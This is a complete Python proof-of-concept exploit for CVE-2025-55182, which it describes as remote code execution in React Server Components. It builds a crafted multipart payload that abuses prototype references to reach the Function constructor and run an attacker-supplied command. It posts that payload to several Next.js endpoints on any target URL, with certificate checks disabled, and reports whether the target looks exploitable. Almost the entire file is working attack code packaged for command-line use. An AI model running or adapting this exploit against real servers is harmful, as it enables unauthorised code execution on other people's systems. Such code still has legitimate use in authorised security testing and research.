#!/usr/bin/env python3
"""
CVE-2025-55182 PoC - React Server Components RCE
Reference: https://github.com/msanft/CVE-2025-55182

This vulnerability allows RCE in React Server Functions through insecure prototype references.
"""

import json
import requests
import sys
from urllib.parse import urljoin

def create_payload(command):
    """
    Create the RCE payload for CVE-2025-55182
    """
    crafted_chunk = {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": json.dumps({"then": "$B0"}),
        "_response": {
            "_prefix": f"{command}",
            "_formData": {
                "get": "$1:constructor:constructor",
            },
        },
    }
    
    files = {
        "0": (None, json.dumps(crafted_chunk)),
        "1": (None, '"$@0"'),
    }
    
    return files

def exploit(target_url, command="whoami"):
    """
    Exploit CVE-2025-55182 on target URL
    """
    try:
        # Normalize URL
        if not target_url.startswith(('http://', 'https://')):
            target_url = f"https://{target_url}"
        
        # Remove trailing slash
        target_url = target_url.rstrip('/')
        
        # Try common Next.js action endpoints
        endpoints = [
            f"{target_url}/",
            f"{target_url}/api",
            f"{target_url}/_next/static",
        ]
        
        payload = create_payload(command)
        
        headers = {
            "Next-Action": "foo",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary",
        }
        
        for endpoint in endpoints:
            try:
                response = requests.post(
                    endpoint,
                    files=payload,
                    headers=headers,
                    timeout=10,
                    verify=False,
                    allow_redirects=True
                )
                
                if response.status_code in [200, 500]:
                    # Check if we got a response that indicates execution
                    if "SyntaxError" in response.text or "function" in response.text.lower():
                        return {
                            "vulnerable": True,
                            "status_code": response.status_code,
                            "tested_url": endpoint,
                            "final_url": response.url,
                            "response_preview": response.text[:200],
                        }
            except requests.exceptions.RequestException as e:
                continue
        
        return {
            "vulnerable": False,
            "status_code": None,
            "tested_url": target_url,
            "error": "No vulnerable endpoint found",
        }
        
    except Exception as e:
        return {
            "vulnerable": None,
            "status_code": None,
            "tested_url": target_url,
            "error": str(e),
        }

def main():
    """
    Main function - can be called from API wrapper
    """
    if len(sys.argv) < 2:
        print(json.dumps({"error": "Usage: python poc.py <target_url> [command]"}))
        sys.exit(1)
    
    target_url = sys.argv[1]
    command = sys.argv[2] if len(sys.argv) > 2 else "whoami"
    
    result = exploit(target_url, command)
    print(json.dumps(result, indent=2))

if __name__ == "__main__":
    main()

